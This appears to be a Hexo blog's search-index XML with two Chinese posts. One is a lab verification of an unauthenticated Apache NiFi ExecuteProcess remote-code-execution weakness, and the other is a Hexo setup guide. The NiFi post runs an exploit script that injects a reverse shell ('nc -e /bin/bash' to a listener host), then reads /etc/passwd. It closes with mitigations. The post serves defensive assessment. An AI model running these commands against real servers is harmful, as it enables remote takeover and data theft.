            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NIFI远程代码执行漏洞-ExecuteProcess</title>
      <link href="/2021/08/24/nifi-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2021/08/24/nifi-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p><a href="https://packetstormsecurity.com/files/download/160260/apache_nifi_processor_rce.rb.txt"><strong>Apache NiFi API Remote Code Execution</strong></a></p><p><strong><a href="https://github.com/imjdl/Apache-NiFi-Api-RCE">Apache NiFI Api RCE</a></strong></p><p><a href="https://github.com/rapid7/metasploit-framework/pull/14216"><strong>Add new Apache NiFi RCE exploit module</strong></a></p><p>最近公司安全给我维护的NiFi项目提了一个严重的安全漏洞，那么我就来研究一下吧。</p><p>NiFi 的默认安装是不安全的并且通过 HTTP 运行，该漏洞就是是利用 Apache NiFi 中的弱配置，也就是无需用户密码，可通过使用NiFi API自动创建ExecuteProcess 处理器创建、配置和运行命令，然后停止和删除处理器，从而达到悄无声息的进行远程命令攻击。</p><p>NiFi 默认包含许多处理器，其中ExecuteProcess 是一个可用于运行系统命令的处理器。类似的有“危险”处理器，例如 ExecuteScript，利用的系统上已经安装这些脚本语言，通过注入脚本的方式进行远程脚本攻击。</p><h3 id="漏洞前提"><a href="#漏洞前提" class="headerlink" title="漏洞前提"></a>漏洞前提</h3><ol><li>ExecuteProcess 处理器必须可用</li><li>API 必须不安全（或提供凭据/令牌）</li></ol><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ol><li><p>无需登录的NIFI单节点：192.168.42.6</p></li><li><p>kerberos认证的NIFI集群节点：192.168.42.3</p></li><li><p>攻击的服务器：192.168.42.4</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token function">nc</span> -yyum <span class="token function">install</span> nmap -y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>nc的作用<br>（1）实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br>（2）端口的扫描，nc可以作为client发起TCP或UDP连接<br>（3）机器之间传输文件<br>（4）机器之间网络测速  </p></li><li><p>python3.9安装下列模块</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> requests <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="操作验证"><a href="#操作验证" class="headerlink" title="操作验证"></a>操作验证</h3><p>第一步：192.168.42.4开启nc监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/24/nifi-yuan-cheng-dai-ma-zhi-xing-lou-dong/1.png" alt="建立ne连接"></p><p>第二步：执行攻击命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python exp.py <span class="token string">"http://192.168.42.6:8080"</span> <span class="token string">"nc -e /bin/bash 192.168.42.4 1234"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/24/nifi-yuan-cheng-dai-ma-zhi-xing-lou-dong/2.png" alt="executeProcessor"></p><p>页面多了一个ExecuteProcess</p><p><img src="/2021/08/24/nifi-yuan-cheng-dai-ma-zhi-xing-lou-dong/3.png" alt="flow创建历史查看"></p><p>NiFi History记录了ExecuteProcess创建过程</p><p><img src="/2021/08/24/nifi-yuan-cheng-dai-ma-zhi-xing-lou-dong/4.png" alt="配置查看"></p><p>查看ExecuteProcess注入的配置</p><p>第三步：192.168.42.4执行攻击命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/24/nifi-yuan-cheng-dai-ma-zhi-xing-lou-dong/5.png" alt="攻击查看密码"></p><p>如上图，192.168.42.6的命令就可以操作。</p><p>第四步：攻击有kerberos认证的NIFI服务器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python exp.py <span class="token string">"http://192.168.42.3:8080"</span> <span class="token string">"nc -e /bin/bash 192.168.42.4 1234"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/24/nifi-yuan-cheng-dai-ma-zhi-xing-lou-dong/6.png" alt="https防攻击"></p><p>如图，因为有密码则无法简单的连接注入脚本攻击</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ol><li>NIFI的不设置登录是不安全。</li><li>NIFI的强大的脚本执行处理器以及脚本执行处理器存在注入风险。</li><li>NIFI1.14.0一下版本均存在上述风险，解决措施<ul><li>给NIFI设置密码，定期更换密码，不适用弱密码</li><li>从源码nar包中剔除有注入风险的处理器，需要重新编译源码</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> etl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nifi </tag>
            
            <tag> ExecuteProcess </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEXO搭建博客</title>
      <link href="/2021/08/21/hexo-da-jian-bo-ke/"/>
      <url>/2021/08/21/hexo-da-jian-bo-ke/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><table><thead><tr><th align="center">环境</th><th align="center">版本</th><th align="center">安装命令</th></tr></thead><tbody><tr><td align="center">npm</td><td align="center">7.21.0</td><td align="center">npm</td></tr><tr><td align="center">node</td><td align="center">V14.17.5</td><td align="center"></td></tr><tr><td align="center">hexo-cli</td><td align="center">4.3.0</td><td align="center">npm install hexo-cli -g</td></tr><tr><td align="center">hexo</td><td align="center">5.4.0</td><td align="center"></td></tr></tbody></table><p>成功构建环境：mac、windows</p><h2 id="工程创建"><a href="#工程创建" class="headerlink" title="工程创建"></a>工程创建</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-cli -ghexo init blog<span class="token builtin class-name">cd</span> blog/themes <span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/blog<span class="token function">npm</span> <span class="token function">install</span>hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="主题配置修改"><a href="#主题配置修改" class="headerlink" title="主题配置修改"></a>主题配置修改</h2><p>详细：<a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">hexo-theme-matery</a></p><h2 id="文章新建"><a href="#文章新建" class="headerlink" title="文章新建"></a>文章新建</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h2 id="标题写法"><a href="#标题写法" class="headerlink" title="标题写法"></a>标题写法</h2><h3 id="简单写法"><a href="#简单写法" class="headerlink" title="简单写法"></a>简单写法</h3><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token front-matter-block"><span class="token punctuation">---</span><span class="token font-matter yaml language-yaml"><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme Theme introduction<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span></span><span class="token punctuation">---</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂写法"><a href="#复杂写法" class="headerlink" title="复杂写法"></a>复杂写法</h3><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token front-matter-block"><span class="token punctuation">---</span><span class="token font-matter yaml language-yaml"><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme Theme introduction<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token key atrule">author</span><span class="token punctuation">:</span> Qi Zhao<span class="token key atrule">img</span><span class="token punctuation">:</span> /source/images/xxx.jpg<span class="token key atrule">top</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">hide</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">cover</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">coverImg</span><span class="token punctuation">:</span> /images/1.jpg<span class="token key atrule">password</span><span class="token punctuation">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92<span class="token key atrule">toc</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">mathjax</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">summary</span><span class="token punctuation">:</span> This is the content of your custom post summary. If there is a value for this attribute<span class="token punctuation">,</span> the post card summary will display the text<span class="token punctuation">,</span> otherwise the program will automatically intercept part of the post content as a summary.<span class="token key atrule">categories</span><span class="token punctuation">:</span> Markdown<span class="token key atrule">tags</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> Typora  <span class="token punctuation">-</span> Markdown</span><span class="token punctuation">---</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="服务启动"><a href="#服务启动" class="headerlink" title="服务启动"></a>服务启动</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo server -p <span class="token number">5000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h2 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h2 id="文章发布"><a href="#文章发布" class="headerlink" title="文章发布"></a>文章发布</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h2 id="重新发布"><a href="#重新发布" class="headerlink" title="重新发布"></a>重新发布</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="鉴权问题"><a href="#鉴权问题" class="headerlink" title="鉴权问题"></a>鉴权问题</h2><pre class="line-numbers language-none"><code class="language-none"> 13 files changed, 26 insertions(+), 26 deletions(-)Username for 'https://github.com': huhuhuhrPassword for 'https://huhuhuhr@github.com': remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ for more information.fatal: 'https://github.com/huhuhuHR/huhuhuhr.github.io/' 鉴权失败FATAL {  err: Error: Spawn failed      at ChildProcess.&lt;anonymous&gt; (/Users/niejing/Documents/GitHub/blog/node_modules/hexo-util/lib/spawn.js:51:21)      at ChildProcess.emit (events.js:400:28)      at Process.ChildProcess._handle.onexit (internal/child_process.js:277:12) {    code: 128  }} Something's wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.htmlniejing@niejingdeMacBook-Pro blog % hexo clean &amp;&amp; hexo deploy <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原因：github不再通过密码鉴权，而是通过token</p><p>详细参考：<a href="https://stackoverflow.com/questions/68775869/support-for-password-authentication-was-removed-please-use-a-personal-access-to">鉴权</a></p><h2 id="订阅问题"><a href="#订阅问题" class="headerlink" title="订阅问题"></a>订阅问题</h2><pre class="line-numbers language-none"><code class="language-none">This XML file does not appear to have any style information associated with it. The document tree is shown below.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不好用,直接在主题给关闭了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socialLink:  github:  https://github.com/huhuhuHR  email: <span class="token number">757033301</span>@qq.com  facebook: <span class="token comment"># https://www.facebook.com/xxx</span>  twitter: <span class="token comment"># https://twitter.com/xxx</span>  qq: <span class="token number">757033301</span>  weibo: <span class="token comment"># https://weibo.com/xxx</span>  zhihu: <span class="token comment"># https://www.zhihu.com/xxx</span>  rss: <span class="token boolean">false</span> <span class="token comment"># true、false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
